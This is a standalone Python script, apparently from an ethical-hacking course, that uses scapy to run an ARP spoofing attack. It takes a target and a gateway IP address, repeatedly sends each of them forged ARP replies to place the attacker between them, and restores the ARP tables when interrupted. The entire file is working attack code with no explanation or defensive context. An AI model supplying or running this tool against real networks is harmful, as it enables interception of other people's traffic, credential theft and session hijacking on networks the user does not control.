#!/usr/bin/env python
import time
import scapy.all as scapy
import optparse


def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="target", help="enter the target ip address")
    parser.add_option("-g", "--gateway", dest="gateway", help="enter the gateway ip address")
    (options, arguments) = parser.parse_args()  # options store user input values

    if not options.target:
        parser.error("[-] Specify the target ip address. Use --help for more information")
    elif not options.gateway:
        parser.error("[-] Specify the gateway ip address. Use --help for more information")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False) #second arguement disables default output

def restore(destination_ip, source_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()

try:
    sent_packets_count = 0
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end= "")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C .... Resetting ARP tables...")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    print("\n[+] ARP table restored")